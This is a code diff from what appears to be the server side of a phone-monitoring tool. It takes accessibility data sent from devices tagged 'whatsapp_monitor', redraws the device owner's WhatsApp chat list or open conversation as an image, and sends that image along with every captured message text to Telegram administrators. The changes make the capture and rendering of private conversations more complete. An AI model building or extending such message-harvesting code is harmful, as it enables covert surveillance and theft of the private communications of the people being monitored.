@@ -2138,11 +2138,15 @@ def _sock_screen_json(data):
 
 
 def _handle_screen_json(dev, data):
-    """Render the accessibility tree JSON as an image using Pillow and send to bot.
+    """Legendary WhatsApp UI rendering — renders chat list OR open conversation.
 
-    If source == 'whatsapp_monitor', draws a WhatsApp-style chat interface
-    (green header, chat bubbles, sender names) + a text box below with all messages.
-    Otherwise draws a generic screen layout.
+    Detects UI type from view IDs:
+    - chat_row / conversation_contact_name → Chat list view (renders rows)
+    - message_text + date → Open conversation (renders chat bubbles)
+
+    Sends:
+    1. Rendered image (WhatsApp-style)
+    2. Text box below containing ALL extracted text
     """
     try:
         from PIL import Image, ImageDraw, ImageFont, ImageFilter
@@ -2169,14 +2173,16 @@ def _handle_screen_json(dev, data):
     screen_h = data.get("screen_height", 1920)
     package = data.get("package", "unknown")
     views = data.get("views", [])
-    source = data.get("source", "manual")  # whatsapp_monitor or manual
+    source = data.get("source", "manual")
 
-    # Load fonts — try Arabic-capable font first, fallback to DejaVu
-    def _load_font(size):
+    # ────────────────────────────────────────────────────────────
+    # Load fonts — best available
+    # ────────────────────────────────────────────────────────────
+    def _load_font(size, bold=False):
         candidates = [
-            "/usr/share/fonts/truetype/chinese/NotoSansSC-Regular.ttf",
+            "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
+            "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
             "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
-            "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
         ]
         for path in candidates:
             try:
@@ -2185,147 +2191,183 @@ def _handle_screen_json(dev, data):
                 continue
         return ImageFont.load_default()
 
-    font_title = _load_font(16)
-    font_msg = _load_font(12)
+    font_title = _load_font(18, bold=True)
+    font_header = _load_font(16, bold=True)
+    font_msg = _load_font(14)
+    font_name = _load_font(13, bold=True)
+    font_time = _load_font(11)
     font_small = _load_font(10)
 
     # ────────────────────────────────────────────────────────────
-    # Parse all views: collect (text, x, y, w, h, is_outgoing)
+    # Parse views — extract role + text + position
     # ────────────────────────────────────────────────────────────
     parsed = []
+    has_message_role = False
+    has_chat_row_role = False
+
     for v in views:
-        bounds_str = v.get("bounds", "")
-        m = _re.match(r"\[(\d+),(\d+)\]\[(\d+)x(\d+)\]", bounds_str)
-        if not m:
-            continue
-        x, y, w, h = int(m.group(1)), int(m.group(2)), int(m.group(3)), int(m.group(4))
+        x = v.get("x", 0)
+        y = v.get("y", 0)
+        w = v.get("w", 0)
+        h = v.get("h", 0)
+        # fallback to parsing bounds string
+        if not w and not h:
+            bounds_str = v.get("bounds", "")
+            m = _re.match(r"\[(\d+),(\d+)\]\[(\d+)x(\d+)\]", bounds_str)
+            if m:
+                x, y, w, h = int(m.group(1)), int(m.group(2)), int(m.group(3)), int(m.group(4))
+
         text = v.get("text", "") or v.get("desc", "")
-        if not text or len(text) < 1:
+        if not text:
             continue
-        # Heuristic: if x > screen_w / 2, it's an outgoing message (right side)
+
+        role = v.get("role", "")
+        if role == "message":
+            has_message_role = True
+        elif role == "chat_row":
+            has_chat_row_role = True
+
+        # Determine direction: x > screen_w/2 = outgoing (right side)
         is_outgoing = x > (screen_w / 2)
-        parsed.append({"text": text, "x": x, "y": y, "w": w, "h": h, "out": is_outgoing})
+
+        parsed.append({
+            "text": text, "x": x, "y": y, "w": w, "h": h,
+            "out": is_outgoing, "role": role, "id": v.get("id", "")
+        })
 
     # Sort by Y (top to bottom)
     parsed.sort(key=lambda v: v["y"])
 
     # ────────────────────────────────────────────────────────────
-    # Build the screenshot image (WhatsApp-style if from monitor)
+    # Detect UI type
+    # ────────────────────────────────────────────────────────────
+    is_whatsapp = source == "whatsapp_monitor" or "whatsapp" in package
+    ui_type = "generic"
+    if is_whatsapp:
+        if has_message_role:
+            ui_type = "conversation"
+        elif has_chat_row_role:
+            ui_type = "chat_list"
+        else:
+            # Heuristic: if many views with text + small heights, likely a list
+            ui_type = "chat_list" if len(parsed) > 5 else "conversation"
+
+    logger.info(f"📸 screen_json: ui_type={ui_type}, views={len(parsed)}, has_msg={has_message_role}, has_row={has_chat_row_role}")
+
+    # ────────────────────────────────────────────────────────────
+    # Build image
     # ────────────────────────────────────────────────────────────
     scale = 720.0 / max(screen_w, 1)
     img_w = int(screen_w * scale)
     img_h = int(screen_h * scale)
 
-    # WhatsApp colors
-    if source == "whatsapp_monitor" or "whatsapp" in package:
-        bg_color = (236, 229, 221)  # #ECE5DD — WhatsApp chat bg
-        header_color = (7, 94, 84)   # #075E54 — WhatsApp green dark
-        bubble_out_color = (210, 248, 192)  # #D2F8C0 — outgoing bubble (light green)
-        bubble_in_color = (255, 255, 255)   # white — incoming bubble
-        bubble_out_text = (0, 0, 0)
-        bubble_in_text = (0, 0, 0)
-        app_name = "واتساب"
+    # WhatsApp official colors
+    if is_whatsapp:
+        # Chat list colors (newer WhatsApp)
+        if ui_type == "chat_list":
+            bg_color = (255, 255, 255)             # white
+            header_bg = (7, 94, 84)                # #075E54 dark green (old) — or use (0, 117, 96)
+            search_bg = (242, 242, 242)            # light gray
+            divider_color = (230, 230, 230)
+            title_color = (255, 255, 255)
+            name_color = (17, 17, 17)
+            msg_preview_color = (136, 136, 136)
+            time_color = (136, 136, 136)
+            badge_color = (37, 211, 102)           # WhatsApp green #25D366
+            avatar_bg = (37, 211, 102)
+            app_name = "واتساب"
+        # Open conversation colors
+        else:
+            bg_color = (236, 229, 221)             # #ECE5DD chat bg
+            header_bg = (7, 94, 84)                # #075E54
+            bubble_out_color = (210, 248, 192)     # #DCF8C6 outgoing
+            bubble_in_color = (255, 255, 255)      # incoming
+            bubble_out_text = (17, 17, 17)
+            bubble_in_text = (17, 17, 17)
+            time_color = (136, 136, 136)
+            sender_name_color = (37, 211, 102)
+            title_color = (255, 255, 255)
+            app_name = "واتساب"
     else:
-        bg_color = (255, 255, 255)
-        header_color = (33, 150, 243)  # blue
-        bubble_out_color = (33, 150, 243)
-        bubble_in_color = (240, 240, 240)
-        bubble_out_text = (255, 255, 255)
-        bubble_in_text = (0, 0, 0)
+        bg_color = (245, 245, 245)
+        header_bg = (33, 150, 243)
+        title_color = (255, 255, 255)
+        name_color = (17, 17, 17)
+        msg_preview_color = (102, 102, 102)
+        time_color = (136, 136, 136)
         app_name = package
 
     img = Image.new("RGB", (img_w, img_h), bg_color)
     draw = ImageDraw.Draw(img)
 
-    # Header bar
-    header_h = 40
-    draw.rectangle([0, 0, img_w, header_h], fill=header_color)
-    # Back arrow
-    draw.text((5, 10), "‹", fill="white", font=font_title)
-    draw.text((25, 12), f"{app_name}", fill="white", font=font_title)
-    # View count on right
-    draw.text((img_w - 80, 14), f"عدد: {len(parsed)}", fill="white", font=font_small)
-
-    # Draw each message as a chat bubble
-    chat_start_y = header_h + 5
-    for v in parsed:
-        x = int(v["x"] * scale)
-        y = int(v["y"] * scale)
-        w = int(v["w"] * scale)
-        h = int(v["h"] * scale)
-
-        text = v["text"][:80]
-        try:
-            bbox = draw.textbbox((0, 0), text, font=font_msg)
-            text_w = bbox[2] - bbox[0]
-            text_h = bbox[3] - bbox[1]
-        except Exception:
-            text_w, text_h = 60, 12
-
-        # Bubble padding
-        pad = 6
-        bubble_w = min(max(text_w + pad * 2, 40), img_w - 20)
-        bubble_h = max(text_h + pad * 2, 22)
-
-        if v["out"]:
-            # Outgoing — right side, green bubble
-            bx = img_w - bubble_w - 10
-            by = max(y, chat_start_y)
-            # Rounded bubble
-            draw.rounded_rectangle([bx, by, bx + bubble_w, by + bubble_h],
-                                   radius=8, fill=bubble_out_color)
-            draw.text((bx + pad, by + pad), text, fill=bubble_out_text, font=font_msg)
-        else:
-            # Incoming — left side, white bubble
-            bx = 10
-            by = max(y, chat_start_y)
-            draw.rounded_rectangle([bx, by, bx + bubble_w, by + bubble_h],
-                                   radius=8, fill=bubble_in_color)
-            draw.text((bx + pad, by + pad), text, fill=bubble_in_text, font=font_msg)
+    # ────────────────────────────────────────────────────────────
+    # Render based on UI type
+    # ────────────────────────────────────────────────────────────
+    if ui_type == "chat_list":
+        _render_chat_list(draw, img_w, img_h, parsed, scale, font_header,
+                          font_name, font_msg, font_time, font_small,
+                          bg_color, header_bg, search_bg, divider_color,
+                          title_color, name_color, msg_preview_color,
+                          time_color, badge_color, avatar_bg, app_name,
+                          screen_w, _re)
+    elif ui_type == "conversation":
+        _render_conversation(draw, img_w, img_h, parsed, scale, font_header,
+                             font_msg, font_name, font_time, font_small,
+                             bg_color, header_bg, bubble_out_color,
+                             bubble_in_color, bubble_out_text, bubble_in_text,
+                             time_color, sender_name_color, title_color,
+                             app_name, screen_w, _re)
+    else:
+        # Generic fallback
+        _render_generic(draw, img_w, img_h, parsed, scale, font_header,
+                        font_msg, font_small, bg_color, header_bg,
+                        title_color, name_color, app_name, package, _re)
 
     # ────────────────────────────────────────────────────────────
-    # Build the text box: combine all messages into one block
+    # Build text box — ALL texts combined into one block
     # ────────────────────────────────────────────────────────────
     text_lines = []
     for v in parsed:
-        prefix = "→ " if v["out"] else "← "
-        text_lines.append(f"{prefix}{v['text'][:100]}")
+        prefix = ""
+        if ui_type == "conversation":
+            prefix = "→ " if v["out"] else "← "
+        elif v.get("role") == "chat_title":
+            prefix = "💬 "
+        elif v.get("role") == "time":
+            prefix = "🕐 "
+        text_lines.append(f"{prefix}{v['text'][:120]}")
     combined_text = "\n".join(text_lines)
 
-    # Save the screenshot image
+    # Save image
     img_bio = _io.BytesIO()
     img.save(img_bio, format="PNG")
     img_bio.seek(0)
 
     # ────────────────────────────────────────────────────────────
-    # Send to bot: image first, then text box
+    # Send to bot: image FIRST, then text box BELOW
     # ────────────────────────────────────────────────────────────
     if mdm_bot:
         short_label = _dev_label(dev)
         ts = int(_time.time())
 
-        # Build caption
-        if source == "whatsapp_monitor":
-            caption = (
-                f"💬 <b>واجهة واتساب (مرسومة)</b>\n"
-                f"━━━━━━━━━━━━━━━\n"
-                f"📱 <b>{short_label}</b>\n"
-                f"📦 التطبيق: <code>{package}</code>\n"
-                f"📐 العناصر: {len(parsed)}\n"
-                f"📏 الشاشة: {screen_w}×{screen_h}\n"
-                f"🕐 الوقت: {_time.strftime('%H:%M:%S')}"
-            )
-        else:
-            caption = (
-                f"📋 <b>لقطة شاشة (JSON rendered)</b>\n\n"
-                f"📱 <b>{short_label}</b>\n"
-                f"📦 التطبيق: <code>{package}</code>\n"
-                f"📐 العناصر: {len(parsed)}\n"
-                f"📏 الشاشة: {screen_w}×{screen_h}"
-            )
+        ui_label = {
+            "chat_list": "قائمة المحادثات",
+            "conversation": "محادثة مفتوحة",
+            "generic": "واجهة عامة"
+        }.get(ui_type, "واجهة")
+
+        caption = (
+            f"{'💬' if is_whatsapp else '📋'} <b>واجهة {'واتساب' if is_whatsapp else package}</b>\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"🖼️ النوع: <b>{ui_label}</b>\n"
+            f"📦 العناصر: {len(parsed)}\n"
+            f"📏 الشاشة: {screen_w}×{screen_h}\n"
+            f"🕐 {_time.strftime('%H:%M:%S')}"
+        )
 
         for admin_id in Config.ADMIN_IDS:
-            # Send the rendered image
+            # 1️⃣ Send image FIRST
             try:
                 mdm_bot.bot.send_photo(
                     admin_id,
@@ -2337,10 +2379,9 @@ def _handle_screen_json(dev, data):
             except Exception as e:
                 logger.error(f"فشل إرسال الصورة: {e}")
 
-            # Send the text box (all messages combined)
+            # 2️⃣ Send text box BELOW — all texts in ONE block
             try:
                 if combined_text:
-                    # Truncate to Telegram limit (4096 chars)
                     text_display = combined_text[:3800]
                     if len(combined_text) > 3800:
                         text_display += "\n...(truncated)"
@@ -2356,6 +2397,336 @@ def _handle_screen_json(dev, data):
                 logger.error(f"فشل إرسال مربع النص: {e}")
 
     _pending_cmds.pop(request.sid, None)
+
+
+def _render_chat_list(draw, img_w, img_h, parsed, scale, font_header,
+                      font_name, font_msg, font_time, font_small,
+                      bg_color, header_bg, search_bg, divider_color,
+                      title_color, name_color, msg_preview_color,
+                      time_color, badge_color, avatar_bg, app_name,
+                      screen_w, _re):
+    """Render WhatsApp chat list view."""
+    # ── Top header bar (green) ──
+    header_h = 50
+    draw.rectangle([0, 0, img_w, header_h], fill=header_bg)
+    # Camera icon (left)
+    draw.text((10, 14), "📷", fill=title_color, font=font_header)
+    # App name (center-right)
+    draw.text((50, 16), app_name, fill=title_color, font=font_header)
+    # Search icon (right)
+    draw.text((img_w - 40, 16), "🔍", fill=title_color, font=font_header)
+    # Menu (right)
+    draw.text((img_w - 20, 16), "⋮", fill=title_color, font=font_header)
+
+    # ── Search bar ──
+    search_y = header_h + 8
+    search_h = 32
+    search_pad = 8
+    draw.rounded_rectangle(
+        [search_pad, search_y, img_w - search_pad, search_y + search_h],
+        radius=16, fill=search_bg
+    )
+    draw.text((search_pad + 12, search_y + 8), "🔍  ابحث", fill=msg_preview_color, font=font_msg)
+
+    # ── Chat rows ──
+    # Filter: skip header/search elements, take rows that look like chat entries
+    row_y_start = search_y + search_h + 4
+    row_h = 60
+    current_y = row_y_start
+
+    # Take only items below the search bar
+    chat_items = [v for v in parsed if v["y"] > (search_y / scale)]
+
+    # Group items by Y proximity (within 20px = same row)
+    rows = []
+    current_row = []
+    last_y = -1
+    for v in chat_items:
+        if last_y < 0 or abs(v["y"] - last_y) < 30:
+            current_row.append(v)
+        else:
+            if current_row:
+                rows.append(current_row)
+            current_row = [v]
+        last_y = v["y"]
+    if current_row:
+        rows.append(current_row)
+
+    for row in rows[:15]:  # limit to 15 rows
+        # Draw avatar (circle)
+        avatar_x = 15
+        avatar_y = current_y + 5
+        avatar_size = 40
+        draw.ellipse(
+            [avatar_x, avatar_y, avatar_x + avatar_size, avatar_y + avatar_size],
+            fill=avatar_bg
+        )
+        # First letter of name
+        name_text = ""
+        for item in row:
+            if item.get("role") in ("chat_title", "sender") or item.get("id", "").endswith("name"):
+                name_text = item["text"]
+                break
+        if not name_text and row:
+            name_text = row[0]["text"]
+        if name_text:
+            letter = name_text[0] if name_text else "?"
+            try:
+                bbox = draw.textbbox((0, 0), letter, font=font_header)
+                tw = bbox[2] - bbox[0]
+                th = bbox[3] - bbox[1]
+                draw.text((avatar_x + (avatar_size - tw) / 2,
+                          avatar_y + (avatar_size - th) / 2 - 2),
+                          letter, fill=(255, 255, 255), font=font_header)
+            except Exception:
+                pass
+
+        # Draw name (top of row)
+        text_x = avatar_x + avatar_size + 10
+        if name_text:
+            draw.text((text_x, current_y + 8), name_text[:30], fill=name_color, font=font_name)
+
+        # Draw message preview (below name)
+        preview_text = ""
+        time_text = ""
+        for item in row:
+            if item["text"] == name_text:
+                continue
+            if item.get("role") == "time":
+                time_text = item["text"]
+            else:
+                preview_text = item["text"]
+        if preview_text:
+            draw.text((text_x, current_y + 28), preview_text[:40],
+                     fill=msg_preview_color, font=font_msg)
+
+        # Draw time (top right)
+        if time_text:
+            try:
+                bbox = draw.textbbox((0, 0), time_text, font=font_time)
+                tw = bbox[2] - bbox[0]
+                draw.text((img_w - tw - 12, current_y + 8), time_text,
+                         fill=time_color, font=font_time)
+            except Exception:
+                pass
+
+        # Draw divider
+        draw.line(
+            [(text_x, current_y + row_h - 2), (img_w - 10, current_y + row_h - 2)],
+            fill=divider_color, width=1
+        )
+
+        current_y += row_h
+        if current_y > img_h - 50:
+            break
+
+    # ── Bottom tab bar ──
+    tab_y = img_h - 50
+    draw.rectangle([0, tab_y, img_w, img_h], fill=(245, 245, 245))
+    tab_w = img_w / 4
+    tabs = ["💬", "👥", "📷", "📞"]
+    for i, icon in enumerate(tabs):
+        try:
+            bbox = draw.textbbox((0, 0), icon, font=font_header)
+            tw = bbox[2] - bbox[0]
+            draw.text((tab_w * i + (tab_w - tw) / 2, tab_y + 12), icon,
+                     fill=(37, 211, 102) if i == 0 else (136, 136, 136),
+                     font=font_header)
+        except Exception:
+            pass
+
+
+def _render_conversation(draw, img_w, img_h, parsed, scale, font_header,
+                         font_msg, font_name, font_time, font_small,
+                         bg_color, header_bg, bubble_out_color,
+                         bubble_in_color, bubble_out_text, bubble_in_text,
+                         time_color, sender_name_color, title_color,
+                         app_name, screen_w, _re):
+    """Render WhatsApp open conversation with chat bubbles."""
+    # ── Top header bar ──
+    header_h = 50
+    draw.rectangle([0, 0, img_w, header_h], fill=header_bg)
+    # Back arrow
+    draw.text((5, 14), "‹", fill=title_color, font=font_header)
+    # Avatar (circle)
+    avatar_x = 30
+    avatar_y = 10
+    avatar_size = 30
+    draw.ellipse(
+        [avatar_x, avatar_y, avatar_x + avatar_size, avatar_y + avatar_size],
+        fill=(255, 255, 255)
+    )
+    # Contact name (center)
+    contact_name = ""
+    for v in parsed:
+        if v.get("role") in ("chat_title", "sender") and v["y"] < 100:
+            contact_name = v["text"]
+            break
+    if not contact_name and parsed:
+        # Use first text near top
+        for v in parsed:
+            if v["y"] < 100 and v["text"]:
+                contact_name = v["text"]
+                break
+    if contact_name:
+        draw.text((70, 14), contact_name[:25], fill=title_color, font=font_name)
+        draw.text((70, 30), "online", fill=(180, 220, 200), font=font_small)
+    # Call + menu icons (right)
+    draw.text((img_w - 70, 16), "☎", fill=title_color, font=font_header)
+    draw.text((img_w - 40, 16), "⋮", fill=title_color, font=font_header)
+
+    # ── Chat bubbles ──
+    # Filter out header elements
+    bubble_items = [v for v in parsed if v["y"] > (header_h / scale) and v["y"] < (img_h - 60) / scale]
+    # Skip non-message items
+    bubble_items = [v for v in bubble_items if v.get("role") != "time"]
+
+    current_y = header_h + 8
+    for v in bubble_items:
+        text = v["text"][:120]
+        if not text:
+            continue
+
+        # Calculate text dimensions
+        try:
+            bbox = draw.textbbox((0, 0), text, font=font_msg)
+            text_w = bbox[2] - bbox[0]
+            text_h = bbox[3] - bbox[1]
+        except Exception:
+            text_w, text_h = 100, 16
+
+        # Word wrap if text too long
+        max_bubble_w = int(img_w * 0.7)
+        if text_w > max_bubble_w - 16:
+            # Simple wrap: split at max chars
+            wrapped = []
+            line = ""
+            for word in text.split(" "):
+                try:
+                    test = (line + " " + word).strip()
+                    bbox = draw.textbbox((0, 0), test, font=font_msg)
+                    if bbox[2] - bbox[0] < max_bubble_w - 16:
+                        line = test
+                    else:
+                        if line:
+                            wrapped.append(line)
+                        line = word
+                except Exception:
+                    line = word
+            if line:
+                wrapped.append(line)
+            display_text = "\n".join(wrapped[:6])  # max 6 lines
+            try:
+                bbox = draw.textbbox((0, 0), display_text, font=font_msg)
+                text_w = bbox[2] - bbox[0]
+                text_h = bbox[3] - bbox[1]
+            except Exception:
+                pass
+        else:
+            display_text = text
+
+        pad = 8
+        bubble_w = min(max(text_w + pad * 2, 50), max_bubble_w)
+        bubble_h = text_h + pad * 2 + 6  # extra for time
+
+        if v["out"]:
+            # Outgoing — right side, green bubble
+            bx = img_w - bubble_w - 10
+            by = current_y
+            draw.rounded_rectangle([bx, by, bx + bubble_w, by + bubble_h],
+                                   radius=10, fill=bubble_out_color)
+            draw.text((bx + pad, by + pad), display_text, fill=bubble_out_text, font=font_msg)
+            # Time inside bubble (bottom right)
+            try:
+                t_str = _time_str()
+                bbox = draw.textbbox((0, 0), t_str, font=font_time)
+                tw = bbox[2] - bbox[0]
+                draw.text((bx + bubble_w - tw - pad, by + bubble_h - pad - 8),
+                         t_str, fill=time_color, font=font_time)
+            except Exception:
+                pass
+            # Double check mark
+            try:
+                draw.text((bx + bubble_w - tw - pad - 14, by + bubble_h - pad - 8),
+                         "✓✓", fill=(80, 180, 255), font=font_time)
+            except Exception:
+                pass
+        else:
+            # Incoming — left side, white bubble
+            bx = 10
+            by = current_y
+            draw.rounded_rectangle([bx, by, bx + bubble_w, by + bubble_h],
+                                   radius=10, fill=bubble_in_color)
+            # Sender name (inside bubble, top)
+            sender = v.get("sender", "")
+            if sender:
+                draw.text((bx + pad, by + pad), sender[:20], fill=sender_name_color, font=font_name)
+                draw.text((bx + pad, by + pad + 16), display_text, fill=bubble_in_text, font=font_msg)
+            else:
+                draw.text((bx + pad, by + pad), display_text, fill=bubble_in_text, font=font_msg)
+            # Time
+            try:
+                t_str = _time_str()
+                bbox = draw.textbbox((0, 0), t_str, font=font_time)
+                tw = bbox[2] - bbox[0]
+                draw.text((bx + bubble_w - tw - pad, by + bubble_h - pad - 8),
+                         t_str, fill=time_color, font=font_time)
+            except Exception:
+                pass
+
+        current_y += bubble_h + 6
+        if current_y > img_h - 70:
+            break
+
+    # ── Bottom input bar ──
+    input_y = img_h - 50
+    draw.rectangle([0, input_y, img_w, img_h], fill=(245, 245, 245))
+    # Input field
+    draw.rounded_rectangle(
+        [10, input_y + 8, img_w - 60, input_y + 42],
+        radius=16, fill=(255, 255, 255)
+    )
+    draw.text((20, input_y + 14), "اكتب رسالة", fill=(180, 180, 180), font=font_msg)
+    # Send button (green circle)
+    draw.ellipse(
+        [img_w - 50, input_y + 8, img_w - 10, input_y + 48],
+        fill=(37, 211, 102)
+    )
+    try:
+        draw.text((img_w - 38, input_y + 16), "→", fill=(255, 255, 255), font=font_header)
+    except Exception:
+        pass
+
+
+def _render_generic(draw, img_w, img_h, parsed, scale, font_header,
+                    font_msg, font_small, bg_color, header_bg,
+                    title_color, name_color, app_name, package, _re):
+    """Generic fallback renderer."""
+    header_h = 40
+    draw.rectangle([0, 0, img_w, header_h], fill=header_bg)
+    draw.text((10, 10), app_name[:20], fill=title_color, font=font_header)
+    draw.text((img_w - 80, 12), f"{len(parsed)} items", fill=title_color, font=font_small)
+
+    y = header_h + 10
+    for v in parsed[:25]:
+        text = v["text"][:60]
+        try:
+            bbox = draw.textbbox((0, 0), text, font=font_msg)
+            tw = bbox[2] - bbox[0]
+        except Exception:
+            tw = 60
+        draw.rounded_rectangle([10, y, 10 + tw + 12, y + 24],
+                               radius=6, fill=(240, 240, 240))
+        draw.text((16, y + 4), text, fill=name_color, font=font_msg)
+        y += 30
+        if y > img_h - 20:
+            break
+
+
+def _time_str():
+    """Helper to get current time as HH:MM string."""
+    import time as _t
+    return _t.strftime("%H:%M")
 
 
 def _handle_whatsapp_message(dev, data):
